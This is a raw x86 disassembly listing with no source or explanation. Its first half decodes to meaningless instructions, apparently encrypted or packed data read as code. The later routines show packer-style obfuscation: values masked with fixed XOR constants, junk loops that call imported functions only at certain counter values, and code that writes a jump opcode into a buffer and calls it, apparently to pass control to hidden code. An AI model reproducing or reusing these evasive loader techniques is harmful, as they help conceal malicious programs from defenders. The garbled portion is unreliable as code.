  409b3b:	aas    
  409b3c:	push   edi
  409b3d:	call   0x3e7a2117
  409b42:	adc    BYTE PTR [ebp+0x1d9aa178],dh
  409b48:	out    0xf5,eax
  409b4a:	pusha  
  409b4b:	mov    ch,0x7b
  409b4d:	jns    0x409b46
  409b4f:	sub    BYTE PTR cs:[edx],ch
  409b52:	push   0x3c78af4
  409b57:	pop    esi
  409b58:	jmp    0x5e4b:0x17c4d1b8
  409b5f:	xor    DWORD PTR [ecx],ebp
  409b61:	clc    
  409b62:	cs js  0x409baa
  409b65:	shr    DWORD PTR [eax],cl
  409b67:	js     0x409ba7
  409b69:	inc    edi
  409b6a:	ds jbe 0x409b60
  409b6d:	je     0x409b5c
  409b6f:	add    DWORD PTR [esi+eiz*4],edx
  409b72:	out    0x20,al
  409b74:	sbb    esi,DWORD PTR [esi]
  409b76:	leave  
  409b77:	dec    ebx
  409b78:	out    dx,al
  409b79:	sbb    al,0x37
  409b7b:	push   eax
  409b7c:	jmp    0xafd:0x1d02f8f7
  409b83:	sub    eax,DWORD PTR [eax+0x20f3c37e]
  409b89:	inc    ecx
  409b8a:	mov    esi,0x9580959
  409b8f:	or     al,0x93
  409b91:	(bad)  
  409b92:	pop    esi
  409b93:	jp     0x409c0b
  409b95:	or     BYTE PTR [esi-0x7a],bl
  409b98:	fldenv [ebx+edx*4]
  409b9b:	push   edx
  409b9c:	pop    edx
  409b9d:	mov    cl,0x5c
  409b9f:	jmp    0x50c8:0xec7729e4
  409ba6:	std    
  409ba7:	je     0x409b45
  409ba9:	loopne 0x409bba
  409bab:	xor    edi,DWORD PTR [esi+0x5b2a239f]
  409bb1:	out    dx,eax
  409bb2:	or     eax,0x2beca03d
  409bb7:	outs   dx,BYTE PTR ds:[esi]
  409bb8:	pusha  
  409bb9:	aaa    
  409bba:	fld    DWORD PTR [edi]
  409bbc:	sub    BYTE PTR [eax+0xb],al
  409bbf:	ins    BYTE PTR es:[edi],dx
  409bc0:	scas   eax,DWORD PTR es:[edi]
  409bc1:	inc    ecx
  409bc2:	sub    esp,edi
  409bc4:	test   ch,dh
  409bc6:	xlat   BYTE PTR ds:[ebx]
  409bc7:	stc    
  409bc8:	test   DWORD PTR [ecx+0x393678d0],ecx
  409bce:	sbb    BYTE PTR [ebx],bl
  409bd0:	xchg   edx,eax
  409bd1:	mov    esp,0x80eafdd3
  409bd6:	mov    bh,0x8c
  409bd8:	dec    DWORD PTR [edx]
  409bda:	lds    ecx,FWORD PTR [ebx]
  409bdc:	jo     0x409be9
  409bde:	(bad)  
  409bdf:	(bad)  
  409be0:	iret   
  409be1:	cmp    bh,BYTE PTR [esi+0x62]
  409be4:	scas   eax,DWORD PTR es:[edi]
  409be5:	jl     0x409bbc
  409be7:	mov    ah,0x74
  409be9:	stc    
  409bea:	loope  0x409b85
  409bec:	or     ebx,DWORD PTR [esp+edi*2-0x62]
  409bf0:	cmp    BYTE PTR [ebx-0x7d],ah
  409bf3:	push   cs
  409bf4:	imul   ebx,DWORD PTR [eax-0x77],0xffffffb0
  409bf8:	stos   DWORD PTR es:[edi],eax
  409bf9:	adc    BYTE PTR [ecx-0xa88ffc0],0x1d
  409c00:	out    dx,eax
  409c01:	sbb    bh,dl
  409c03:	lahf   
  409c04:	and    ecx,DWORD PTR [eax+0x24]
  409c07:	xchg   edx,eax
  409c08:	push   ecx
  409c09:	xchg   BYTE PTR ss:[ebx],bh
  409c0c:	lds    esp,FWORD PTR [ecx-0x78e306]
  409c12:	mov    edi,0xa4236471
  409c17:	in     eax,0x19
  409c19:	pop    ecx
  409c1a:	cmp    BYTE PTR [eax],dh
  409c1c:	adc    ch,BYTE PTR [edx]
  409c1e:	xor    BYTE PTR ds:0x39913a8e,0x41
  409c25:	mov    edi,edx
  409c27:	out    0x16,al
  409c29:	mov    bl,cl
  409c2b:	push   edi
  409c2c:	xor    eax,0x8327e8d
  409c31:	dec    eax
  409c32:	cmc    
  409c33:	loop   0x409bf1
  409c35:	jle    0x409c40
  409c37:	fwait
  409c38:	push   esp
  409c39:	push   ss
  409c3a:	test   al,0xf0
  409c3c:	fs scas al,BYTE PTR es:[edi]
  409c3e:	(bad)
  409c42:	pop    ecx
  409c43:	(bad)  
  409c44:	(bad)  
  409c45:	sete   BYTE PTR [eax+0x3ad20bc4]
  409c4c:	pop    ss
  409c4d:	das    
  409c4e:	cs ja  0x409c8a
  409c51:	inc    edx
  409c52:	cmp    eax,0xb010e386
  409c57:	pop    esp
  409c58:	out    0x1a,al
  409c5a:	mov    edi,0x3024f3aa
  409c5f:	jmp    0xd2e1:0xf96b1afc
  409c66:	add    al,0xf1
  409c68:	int3   
  409c69:	aad    0x89
  409c6b:	sbb    al,0x78
  409c6d:	sbb    ebp,DWORD PTR [edx+eax*1]
  409c70:	jbe    0x409cbf
  409c72:	cmp    BYTE PTR [ecx-0x459343a6],0x2b
  409c79:	stc    
  409c7a:	xor    bh,BYTE PTR [ebx+eiz*8+0x7e9f29e8]
  409c81:	jnp    0x409cc7
  409c83:	xor    eax,0xbc8207f1
  409c88:	jmp    0xa3cf:0x18aefde4
  409c8f:	fistp  QWORD PTR [edi+0x78]
  409c92:	mov    cl,0x65
  409c94:	stc    
  409c95:	mov    BYTE PTR [edx],cl
  409c97:	sub    eax,0x3bec8bf9
  409c9c:	retf   0x8b77
  409c9f:	sub    DWORD PTR [edx-0x7d],ecx
  409ca2:	std    
  409ca3:	bound  ecx,QWORD PTR [edx-0x66]
  409ca6:	adc    edx,DWORD PTR [ebp+0x2ef1e8cd]
  409cac:	pusha  
  409cad:	mov    edi,0xd023c23a
  409cb2:	jmp    0x409cfc
  409cb4:	psubq  xmm7,xmm2
  409cb8:	shl    DWORD PTR [esi-0x9],cl
  409cbb:	jge    0x409cbd
  409cbd:	mov    edx,0xf665faa3
  409cc2:	jecxz  0x409cfe
  409cc4:	pop    ebp
  409cc5:	xchg   esi,eax
  409cc6:	sbb    DWORD PTR [ebp-0x17],0x5218701c
  409ccd:	push   edi
  409cce:	bound  ebp,QWORD PTR [ebx+0x50]
  409cd1:	cs cli 
  409cd3:	nop
  409cd4:	dec    edi
  409cd5:	(bad)  
  409cd6:	rcl    DWORD PTR [ecx+0x6a5ca25a],cl
  409cdc:	into   
  409cdd:	daa    
  409cde:	jns    0x409c74
  409ce0:	dec    ebp
  409ce1:	sbb    ebp,DWORD PTR [edx+0x700e79fa]
  409ce7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ce8:	push   ds
  409ce9:	inc    edx
  409cea:	mov    edx,0xa9d8c689
  409cef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409cf0:	call   0x54d5:0x6c783479
  409cf7:	pop    ds
  409cf8:	addr16 push ecx
  409cfa:	xor    BYTE PTR [ecx],ch
  409cfc:	push   esp
  409cfd:	es mov esi,0x5d8e29dd
  409d03:	(bad)  
  409d04:	mov    edx,0x4c2b9764
  409d09:	dec    esi
  409d0a:	rol    DWORD PTR [esp+eax*2-0x17],0x9d
  409d0f:	xchg   ecx,eax
  409d10:	daa    
  409d11:	les    ecx,FWORD PTR [ebp+0x4e]
  409d14:	push   ecx
  409d15:	push   ebx
  409d16:	and    esi,eax
  409d18:	or     eax,0xb85b10aa
  409d1d:	inc    ebx
  409d1e:	cmp    ch,BYTE PTR [edi]
  409d20:	aam    0x7f
  409d22:	jae    0x409d52
  409d24:	inc    edi
  409d25:	inc    esi
  409d26:	adc    esi,edi
  409d28:	(bad)  
  409d29:	or     DWORD PTR ss:[eax-0x5c],edx
  409d2d:	ins    DWORD PTR es:[edi],dx
  409d2e:	mov    bl,0x73
  409d30:	and    DWORD PTR [ebp-0x28c581f7],ebx
  409d36:	dec    eax
  409d37:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d38:	std    
  409d39:	test   al,0x3a
  409d3b:	xchg   edx,eax
  409d3c:	and    DWORD PTR [esi+0x29],edi
  409d3f:	inc    esi
  409d40:	add    BYTE PTR [ebx+0x1bcc3e0d],al
  409d46:	cwde   
  409d47:	jmp    0x409d09
  409d49:	and    eax,0xfb90ffa9
  409d4e:	lds    esi,FWORD PTR [eax+0x59]
  409d51:	xchg   ebp,eax
  409d52:	push   edi
  409d53:	les    esp,FWORD PTR [esi-0x38]
  409d56:	fnstsw WORD PTR [ebp+0x5e]
  409d59:	sub    al,0x58
  409d5b:	cmp    DWORD PTR [eax+0x1],ebp
  409d5e:	outs   dx,BYTE PTR ds:[esi]
  409d5f:	push   ebp
  409d60:	call   0xf947:0xc279e55
  409d67:	pushw  cs
  409d69:	jb     0x409d70
  409d6b:	div    DWORD PTR [edx-0x36]
  409d6e:	xchg   ecx,eax
  409d6f:	sub    DWORD PTR [ecx+0x14b7cdef],ebx
  409d75:	mov    ds:0x3a4ed075,al
  409d7a:	test   DWORD PTR [edx+0x34],ecx
  409d7d:	xlat   BYTE PTR ds:[ebx]
  409d7e:	or     BYTE PTR [edx],dl
  409d80:	push   esp
  409d81:	pop    ecx
  409d82:	sar    DWORD PTR [eax],cl
  409d84:	frstor [esi]
  409d86:	pusha  
  409d87:	hlt    
  409d88:	dec    edx
  409d89:	frstor [ecx-0xa4922a8]
  409d8f:	and    al,0x19
  409d91:	cld    
  409d92:	pop    es
  409d93:	mov    ecx,0x92146065
  409d98:	inc    ebx
  409d99:	sbb    ecx,ebp
  409d9b:	cmp    edx,DWORD PTR [edx+0x66]
  409d9e:	or     eax,0xcbac1533
  409da3:	mov    ds:0x7da6d7dc,al
  409da8:	daa    
  409da9:	js     0x409d6a
  409dab:	in     al,0xa9
  409dad:	xchg   DWORD PTR [esi+0x261b37e1],edi
  409db3:	xor    al,0xf5
  409db5:	imul   esp,DWORD PTR [edi-0x6c],0xffffffb7
  409db9:	dec    ecx
  409dba:	inc    edx
  409dbb:	inc    ebp
  409dbc:	cmp    DWORD PTR [ebx-0x79],0xfffffffa
  409dc0:	cmp    al,0xb3
  409dc2:	stc    
  409dc3:	hlt    
  409dc4:	ficomp WORD PTR [eax]
  409dc6:	mov    eax,0x3078a9c2
  409dcb:	fwait
  409dcc:	push   edi
  409dcd:	aam    0x74
  409dcf:	jecxz  0x409d5e
  409dd1:	repz aaa 
  409dd3:	push   es
  409dd4:	lds    edi,FWORD PTR [edi]
  409dd6:	mov    ah,0x87
  409dd8:	jp     0x409daf
  409dda:	inc    eax
  409ddb:	add    BYTE PTR [ecx],bl
  409ddd:	xchg   esp,eax
  409dde:	dec    edi
  409ddf:	pop    edi
  409de0:	push   es
  409de1:	jne    0x409d8f
  409de3:	retf   0xafad
  409de6:	mov    ch,0xee
  409de8:	stos   DWORD PTR es:[edi],eax
  409de9:	mov    al,ds:0x815921c0
  409dee:	fisub  WORD PTR [edi]
  409df0:	mov    ebx,0xb4dd0387
  409df5:	mov    al,ds:0xf4b7e07
  409dfa:	jp     0x409e10
  409dfc:	js     0x409e2e
  409dfe:	sti    
  409dff:	jp     0x409da4
  409e01:	ins    BYTE PTR es:[edi],dx
  409e02:	fwait
  409e03:	sub    ecx,DWORD PTR [ebp-0x1ae29e29]
  409e09:	sub    eax,0x9302eba6
  409e0e:	mov    ebx,0x36310eea
  409e13:	push   0x26
  409e15:	in     eax,0x9f
  409e17:	cmp    eax,0x5c779059
  409e1c:	add    BYTE PTR [edi-0x6c99a1df],al
  409e22:	mov    ah,0x86
  409e24:	mov    eax,DWORD PTR [edx]
  409e26:	stc    
  409e27:	shl    DWORD PTR [eax],1
  409e29:	jle    0x409e12
  409e2b:	sbb    bl,BYTE PTR [eax]
  409e2d:	outs   dx,DWORD PTR ds:[esi]
  409e2e:	imul   esp,DWORD PTR [ebx],0xfa226c4a
  409e34:	dec    esp
  409e35:	stc    
  409e36:	dec    BYTE PTR [ebp-0x3ef8c905]
  409e3c:	je     0x409dc3
  409e3e:	sbb    eax,0x31deedb0
  409e43:	std    
  409e44:	xor    cl,cl
  409e46:	add    al,0x7d
  409e48:	push   ebx
  409e49:	push   ds
  409e4a:	lods   al,BYTE PTR ds:[esi]
  409e4b:	xchg   esp,eax
  409e4c:	sub    dl,BYTE PTR [esi-0x4a70177e]
  409e52:	add    ecx,DWORD PTR [ebx-0x40]
  409e55:	mov    al,ds:0x86ad282
  409e5a:	mov    ds:0x453341b4,al
  409e5f:	cmp    DWORD PTR ds:0xff1af3a3,ecx
  409e65:	and    DWORD PTR [esi-0x11],0x99117111
  409e6c:	ret    
  409e6d:	sub    al,0x9
  409e6f:	fisttp DWORD PTR [edi]
  409e71:	scas   eax,DWORD PTR es:[edi]
  409e72:	add    cl,BYTE PTR [ebx-0x2ecc03ab]
  409e78:	mov    ecx,DWORD PTR [ebp+0x8]
  409e7b:	lea    ecx,[edx+ecx*1+0x3272dd]
  409e82:	cmp    ecx,eax
  409e84:	je     0x409efb
  409e8a:	mov    edi,DWORD PTR [ebp-0x14]
  409e8d:	mov    eax,DWORD PTR [ebp+0x8]
  409e90:	mov    edx,DWORD PTR [ebp+0x14]
  409e93:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  409e97:	mov    ecx,0x7510896
  409e9c:	xor    edx,edx
  409e9e:	xor    edi,ecx
  409ea0:	mov    esi,0x3272dd
  409ea5:	add    edi,esi
  409ea7:	div    edi
  409ea9:	mov    edx,DWORD PTR [ebp-0x4]
  409eac:	xor    edx,ecx
  409eae:	lea    eax,[edx+eax*1+0x3272dd]
  409eb5:	mov    edx,DWORD PTR [ebp+0x8]
  409eb8:	mov    edi,DWORD PTR [ebp-0x20]
  409ebb:	mov    DWORD PTR [edi+edx*4],eax
  409ebe:	mov    eax,DWORD PTR [ebp-0x14]
  409ec1:	mov    edx,DWORD PTR [ebp+0x8]
  409ec4:	xor    eax,ecx
  409ec6:	lea    eax,[eax+edx*1+0x3272dd]
  409ecd:	mov    DWORD PTR [ebp+0x8],eax
  409ed0:	mov    eax,DWORD PTR [ebp-0x14]
  409ed3:	mov    edx,DWORD PTR [ebp+0x14]
  409ed6:	xor    eax,ecx
  409ed8:	add    eax,esi
  409eda:	imul   eax,DWORD PTR [edx]
  409edd:	mov    edx,DWORD PTR [ebp-0x4]
  409ee0:	xor    edx,ecx
  409ee2:	mov    ecx,DWORD PTR [ebp+0x8]
  409ee5:	lea    ecx,[edx+ecx*1+0x3272dd]
  409eec:	cmp    ecx,eax
  409eee:	jne    0x409e8a
  409ef4:	mov    eax,esi
  409ef6:	jmp    0x409f00
  409efb:	mov    eax,0x3272dd
  409f00:	mov    ebx,0x7510896
  409f05:	mov    ecx,DWORD PTR [ebp-0x4]
  409f08:	xor    ecx,ebx
  409f0a:	add    ecx,eax
  409f0c:	mov    DWORD PTR [ebp-0xc],ecx
  409f0f:	mov    ebx,0x65655
  409f14:	add    ebx,0x3234
  409f1a:	xchg   ebx,esi
  409f1c:	xor    ebx,ebx
  409f1e:	push   esi
  409f1f:	mov    esi,ebx
  409f21:	pop    ebx
  409f22:	mov    edx,esi
  409f24:	add    ebx,0x1002
  409f2a:	lea    eax,[ebp-0x10]
  409f2d:	add    edx,eax
  409f2f:	add    edx,0x5
  409f32:	push   edx
  409f33:	inc    esi
  409f34:	pop    ecx
  409f35:	dec    ecx
  409f36:	xchg   ecx,eax
  409f37:	dec    eax
  409f38:	xchg   ecx,eax
  409f39:	dec    ecx
  409f3a:	xchg   ecx,edx
  409f3c:	dec    edx
  409f3d:	push   edx
  409f3e:	mov    edx,ebx
  409f40:	pop    ebx
  409f41:	dec    ebx
  409f42:	call   DWORD PTR [ebx]
  409f44:	cmp    DWORD PTR [ebp+0x10],esi
  409f47:	je     0x409f66
  409f4d:	xchg   edx,eax
  409f4e:	push   0xb
  409f50:	pop    ecx
  409f51:	push   0x4
  409f53:	pop    ebx
  409f54:	inc    ebx
  409f55:	xchg   ebx,ecx
  409f57:	sub    ebx,ecx
  409f59:	xchg   ebx,ecx
  409f5b:	dec    ecx
  409f5c:	dec    ecx
  409f5d:	mov    eax,DWORD PTR [ebp-0x1c]
  409f60:	imul   eax,ecx
  409f63:	add    esp,eax
  409f65:	xchg   edx,eax
  409f66:	push   eax
  409f67:	xor    ebx,ebx
  409f69:	mov    edx,esp
  409f6b:	dec    edx
  409f6c:	inc    ebx
  409f6d:	add    ebx,DWORD PTR [edx+ebx*1]
  409f70:	dec    ebx
  409f71:	xor    edx,edx
  409f73:	add    DWORD PTR [ebp-0xc],ebx
  409f76:	pop    ebx
  409f77:	mov    eax,DWORD PTR [ebp-0xc]
  409f7a:	pop    edi
  409f7b:	pop    esi
  409f7c:	pop    ebx
  409f7d:	leave  
  409f7e:	ret    0x10
  409f81:	push   ebp
  409f82:	mov    ebp,esp
  409f84:	sub    esp,0x7c
  409f87:	xor    ecx,ecx
  409f89:	xor    ecx,DWORD PTR ds:0x42c014
  409f8f:	xor    DWORD PTR ds:0x42d018,ecx
  409f95:	push   esi
  409f96:	push   edi
  409f97:	movzx  edi,WORD PTR ds:0x429014
  409f9e:	adc    edi,DWORD PTR ds:0x42c018
  409fa4:	mov    DWORD PTR ds:0x429014,edi
  409faa:	mov    eax,ds:0x42e435
  409faf:	or     ecx,0x9a5
  409fb5:	mov    DWORD PTR [ebp-0x24],eax
  409fb8:	mov    eax,ds:0x42e541
  409fbd:	mov    DWORD PTR [ebp-0x34],eax
  409fc0:	or     edi,eax
  409fc2:	and    DWORD PTR [ebp-0x30],0x0
  409fc6:	xor    DWORD PTR ds:0x429018,0x17b1
  409fd0:	mov    DWORD PTR [ebp-0x2c],0xf89c85b5
  409fd7:	mov    DWORD PTR [ebp-0x28],0xf89c85b2
  409fde:	mov    eax,DWORD PTR [ebp-0x10]
  409fe1:	mov    ecx,DWORD PTR [ebp-0x10]
  409fe4:	sub    eax,ecx
  409fe6:	mov    DWORD PTR [ebp-0x10],eax
  409fe9:	xor    DWORD PTR [ebp-0x10],0xf89cb5b5
  409ff0:	and    DWORD PTR ds:0x42901c,0x0
  409ffa:	xor    eax,eax
  409ffc:	or     eax,DWORD PTR ds:0x42901c
  40a002:	inc    eax
  40a003:	mov    ds:0x42901c,eax
  40a008:	cmp    DWORD PTR ds:0x42901c,0xb
  40a00f:	jne    0x40a029
  40a015:	push   0x42e14e
  40a01a:	push   DWORD PTR [ebp-0xc]
  40a01d:	push   DWORD PTR [ebp-0x18]
  40a020:	push   DWORD PTR [ebp-0x24]
  40a023:	call   DWORD PTR ds:0x42ed61
  40a029:	cmp    DWORD PTR ds:0x42901c,0xa
  40a030:	jne    0x40a041
  40a036:	mov    eax,ds:0x42901c
  40a03b:	inc    eax
  40a03c:	mov    ds:0x42901c,eax
  40a041:	cmp    DWORD PTR ds:0x42901c,0x13
  40a048:	jb     0x409ffa
  40a04e:	sub    eax,esi
  40a050:	mov    eax,DWORD PTR [ebp-0x18]
  40a053:	mov    ecx,DWORD PTR [ebp-0x18]
  40a056:	sub    eax,ecx
  40a058:	mov    DWORD PTR [ebp-0x18],eax
  40a05b:	and    DWORD PTR ds:0x429000,0x0
  40a065:	mov    edi,DWORD PTR ds:0x429000
  40a06b:	inc    edi
  40a06c:	mov    DWORD PTR ds:0x429000,edi
  40a072:	cmp    DWORD PTR ds:0x429000,0xe
  40a079:	jne    0x40a08f
  40a07f:	push   0x429000
  40a084:	push   0x4a29
  40a089:	call   DWORD PTR ds:0x42ed65
  40a08f:	cmp    DWORD PTR ds:0x429000,0xd
  40a096:	jne    0x40a0ab
  40a09c:	xor    edi,edi
  40a09e:	or     edi,DWORD PTR ds:0x429000
  40a0a4:	inc    edi
  40a0a5:	mov    DWORD PTR ds:0x429000,edi
  40a0ab:	cmp    DWORD PTR ds:0x429000,0x1e
  40a0b2:	jb     0x40a065
  40a0b8:	and    eax,0x2f3f
  40a0bd:	or     DWORD PTR [ebp-0x18],0xf89f05b5
  40a0c4:	mov    eax,DWORD PTR [ebp-0xc]
  40a0c7:	mov    ecx,DWORD PTR [ebp-0xc]
  40a0ca:	or     edi,esi
  40a0cc:	sub    eax,ecx
  40a0ce:	xor    edi,edi
  40a0d0:	xor    edi,DWORD PTR ds:0x42d004
  40a0d6:	and    DWORD PTR ds:0x429008,edi
  40a0dc:	mov    DWORD PTR [ebp-0xc],eax
  40a0df:	sbb    DWORD PTR ds:0x42a018,0x66a3
  40a0e9:	or     DWORD PTR [ebp-0xc],0xf89c85f5
  40a0f0:	adc    DWORD PTR ds:0x42b010,ecx
  40a0f6:	mov    eax,DWORD PTR [ebp-0x1c]
  40a0f9:	mov    ecx,DWORD PTR [ebp-0x1c]
  40a0fc:	xor    esi,esi
  40a0fe:	xor    esi,DWORD PTR ds:0x411fec
  40a104:	mov    edi,DWORD PTR ds:0x411ff8
  40a10a:	sub    edi,esi
  40a10c:	and    esi,DWORD PTR [esi+edi*1]
  40a10f:	sub    eax,ecx
  40a111:	and    DWORD PTR ds:0x42c008,0x0
  40a11b:	mov    ecx,DWORD PTR ds:0x42c008
  40a121:	inc    ecx
  40a122:	mov    DWORD PTR ds:0x42c008,ecx
  40a128:	cmp    DWORD PTR ds:0x42c008,0x16
  40a12f:	jne    0x40a159
  40a135:	push   0x2fca
  40a13a:	push   0x42c014
  40a13f:	push   0x8b86
  40a144:	push   0x42e0af
  40a149:	push   0x5b55
  40a14e:	push   0x1406
  40a153:	call   DWORD PTR ds:0x42ed6d
  40a159:	cmp    DWORD PTR ds:0x42c008,0x10
  40a160:	jb     0x40a11b
  40a166:	add    DWORD PTR ds:0x42a018,ecx
  40a16c:	mov    DWORD PTR [ebp-0x1c],eax
  40a16f:	adc    DWORD PTR ds:0x42d018,ebx
  40a175:	or     DWORD PTR [ebp-0x1c],0xf89c85d5
  40a17c:	mov    eax,DWORD PTR [ebp-0x20]
  40a17f:	mov    ecx,DWORD PTR [ebp-0x20]
  40a182:	mov    DWORD PTR ds:0x42c014,0x17
  40a18c:	cmp    DWORD PTR ds:0x42c014,0x0
  40a193:	je     0x40a1be
  40a199:	cmp    DWORD PTR ds:0x42c014,0x22
  40a1a0:	jne    0x40a1ac
  40a1a6:	call   DWORD PTR ds:0x42ed71
  40a1ac:	mov    esi,DWORD PTR ds:0x42c014
  40a1b2:	dec    esi
  40a1b3:	mov    DWORD PTR ds:0x42c014,esi
  40a1b9:	jmp    0x40a18c
  40a1be:	sub    eax,ecx
  40a1c0:	and    DWORD PTR ds:0x42a004,0x0
  40a1ca:	jmp    0x40a1dc
  40a1cf:	mov    edi,DWORD PTR ds:0x42a004
  40a1d5:	inc    edi
  40a1d6:	mov    DWORD PTR ds:0x42a004,edi
  40a1dc:	cmp    DWORD PTR ds:0x42a004,0x15
  40a1e3:	jae    0x40a220
  40a1e9:	cmp    DWORD PTR ds:0x42a004,0x6
  40a1f0:	jne    0x40a201
  40a1f6:	push   0x42c008
  40a1fb:	call   DWORD PTR ds:0x42ed75
  40a201:	cmp    DWORD PTR ds:0x42a004,0x5
  40a208:	jne    0x40a21b
  40a20e:	mov    edi,DWORD PTR ds:0x42a004
  40a214:	inc    edi
  40a215:	mov    DWORD PTR ds:0x42a004,edi
  40a21b:	jmp    0x40a1cf
  40a220:	mov    DWORD PTR [ebp-0x20],eax
  40a223:	mov    eax,DWORD PTR [ebp-0x2c]
  40a226:	mov    ecx,DWORD PTR [ebp-0x20]
  40a229:	mov    esi,0x7510896
  40a22e:	xor    eax,esi
  40a230:	mov    edi,0x3272dd
  40a235:	add    eax,edi
  40a237:	or     eax,ecx
  40a239:	mov    DWORD PTR [ebp-0x20],eax
  40a23c:	mov    eax,DWORD PTR [ebp-0x4]
  40a23f:	mov    ecx,DWORD PTR [ebp-0x4]
  40a242:	sub    eax,ecx
  40a244:	mov    DWORD PTR [ebp-0x4],eax
  40a247:	or     DWORD PTR [ebp-0x4],0xf89c85be
  40a24e:	mov    eax,DWORD PTR [ebp-0xc]
  40a251:	xor    eax,esi
  40a253:	add    eax,edi
  40a255:	push   eax
  40a256:	mov    eax,DWORD PTR [ebp-0x10]
  40a259:	xor    eax,esi
  40a25b:	add    eax,edi
  40a25d:	push   eax
  40a25e:	mov    eax,DWORD PTR [ebp-0x4]
  40a261:	xor    eax,esi
  40a263:	add    eax,edi
  40a265:	push   eax
  40a266:	lea    eax,[ebp-0x7c]
  40a269:	push   eax
  40a26a:	push   DWORD PTR [ebp-0x2c]
  40a26d:	push   DWORD PTR [ebp-0x28]
  40a270:	call   0x40f163
  40a275:	test   eax,eax
  40a277:	je     0x40a2a5
  40a27d:	lea    eax,[ebp-0x7c]
  40a280:	push   eax
  40a281:	mov    eax,DWORD PTR [ebp-0x28]
  40a284:	xor    eax,esi
  40a286:	add    eax,edi
  40a288:	push   eax
  40a289:	mov    eax,DWORD PTR [ebp-0x24]
  40a28c:	add    eax,0xaa
  40a291:	push   eax
  40a292:	mov    eax,DWORD PTR [ebp-0x24]
  40a295:	mov    eax,DWORD PTR [eax+0x198]
  40a29b:	push   DWORD PTR [eax]
  40a29d:	call   0x40508b
  40a2a2:	mov    DWORD PTR [ebp-0x14],eax
  40a2a5:	lea    eax,[ebp+0x4]
  40a2a8:	mov    DWORD PTR [ebp-0x30],eax
  40a2ab:	mov    eax,DWORD PTR [ebp-0x14]
  40a2ae:	test   eax,eax
  40a2b0:	je     0x40a318
  40a2b6:	lea    eax,[ebp-0x8]
  40a2b9:	mov    DWORD PTR [ebp-0x38],eax
  40a2bc:	mov    eax,DWORD PTR [ebp-0x34]
  40a2bf:	mov    DWORD PTR [ebp-0x8],eax
  40a2c2:	mov    eax,DWORD PTR [ebp-0x8]
  40a2c5:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2c8:	sub    eax,ecx
  40a2ca:	mov    DWORD PTR [ebp-0x8],eax
  40a2cd:	mov    ecx,DWORD PTR [ebp-0x4]
  40a2d0:	xor    ecx,esi
  40a2d2:	mov    eax,0xffcd8d23
  40a2d7:	sub    eax,ecx
  40a2d9:	add    DWORD PTR [ebp-0x8],eax
  40a2dc:	mov    eax,DWORD PTR [ebp-0x8]
  40a2df:	mov    ecx,DWORD PTR [ebp-0x14]
  40a2e2:	mov    DWORD PTR [ecx+0x1],eax
  40a2e5:	mov    eax,DWORD PTR [ebp-0x14]
  40a2e8:	push   DWORD PTR [ebp-0x24]
  40a2eb:	mov    BYTE PTR [eax],0xe9
  40a2ee:	mov    eax,ds:0x42e2b1
  40a2f3:	push   DWORD PTR [eax]
  40a2f5:	push   DWORD PTR ds:0x42e50d
  40a2fb:	push   DWORD PTR ds:0x42e2b9
  40a301:	push   DWORD PTR ds:0x42e4ed
  40a307:	push   DWORD PTR ds:0x42eafd
  40a30d:	push   DWORD PTR [ebp-0x28]
  40a310:	push   DWORD PTR [ebp-0x2c]
  40a313:	mov    eax,DWORD PTR [ebp-0x14]
  40a316:	call   eax
  40a318:	mov    eax,DWORD PTR [ebp-0x30]
  40a31b:	mov    ecx,DWORD PTR ds:0x42e4b1
  40a321:	add    DWORD PTR [eax],ecx
  40a323:	pop    edi
  40a324:	pop    esi
  40a325:	leave  
  40a326:	ret    
  40a327:	push   ebp
  40a328:	mov    ebp,esp
  40a32a:	sub    esp,0x18
  40a32d:	mov    DWORD PTR [ebp-0x10],0xf89f85b5
  40a334:	lea    eax,[ebp+0x14]
  40a337:	mov    DWORD PTR [ebp-0x4],eax
  40a33a:	add    edx,0x781f
  40a340:	push   esi
  40a341:	and    esi,esi
  40a343:	mov    esi,0xf89c85b5
  40a348:	mov    DWORD PTR [ebp-0xc],esi
  40a34b:	lea    eax,[ebp-0xc]
  40a34e:	mov    DWORD PTR [ebp-0x14],eax
  40a351:	mov    eax,DWORD PTR [ebp-0xc]
  40a354:	mov    edx,DWORD PTR [ebp-0x14]
  40a357:	mov    ecx,0x7510896
  40a35c:	and    DWORD PTR ds:0x42d010,0x34d
  40a366:	xor    eax,ecx
  40a368:	sub    DWORD PTR ds:0x42a00c,0x429018
  40a372:	add    eax,0x3272dd
  40a377:	adc    DWORD PTR ds:0x42d00c,0x760b
  40a381:	mov    DWORD PTR [edx],eax
  40a383:	dec    edx
  40a384:	mov    eax,ds:0x42e2ad
  40a389:	sub    DWORD PTR ds:0x429008,ecx
  40a38f:	mov    edx,DWORD PTR [ebp-0x4]
  40a392:	mov    eax,DWORD PTR [eax]
  40a394:	and    DWORD PTR ds:0x42d004,0x42a01c
  40a39e:	add    eax,DWORD PTR [edx]
  40a3a0:	push   edi
  40a3a1:	mov    DWORD PTR [ebp-0x8],eax
  40a3a4:	and    DWORD PTR ds:0x42c008,0x0
  40a3ae:	jmp    0x40a3c0
  40a3b3:	mov    edi,DWORD PTR ds:0x42c008
  40a3b9:	inc    edi
  40a3ba:	mov    DWORD PTR ds:0x42c008,edi
  40a3c0:	cmp    DWORD PTR ds:0x42c008,0x1f
  40a3c7:	jae    0x40a451
  40a3cd:	cmp    DWORD PTR ds:0x42c008,0x25
  40a3d4:	jne    0x40a3e8
  40a3da:	push   0x3550
  40a3df:	push   DWORD PTR [ebp-0x1c]
  40a3e2:	call   DWORD PTR ds:0x42ed35
  40a3e8:	jmp    0x40a3b3
  40a3ed:	and    DWORD PTR ds:0x42d018,0x0
  40a3f7:	jmp    0x40a407
  40a3fc:	mov    eax,ds:0x42d018
  40a401:	inc    eax
  40a402:	mov    ds:0x42d018,eax
  40a407:	cmp    DWORD PTR ds:0x42d018,0x1a
  40a40e:	jae    0x40a451
  40a414:	cmp    DWORD PTR ds:0x42d018,0x8
  40a41b:	jne    0x40a434
  40a421:	push   DWORD PTR [ebp-0x1c]
  40a424:	push   0x42d014
  40a429:	push   0x5fa0
  40a42e:	call   DWORD PTR ds:0x42ed39
  40a434:	cmp    DWORD PTR ds:0x42d018,0x7
  40a43b:	jne    0x40a44c
  40a441:	mov    eax,ds:0x42d018
  40a446:	inc    eax
  40a447:	mov    ds:0x42d018,eax
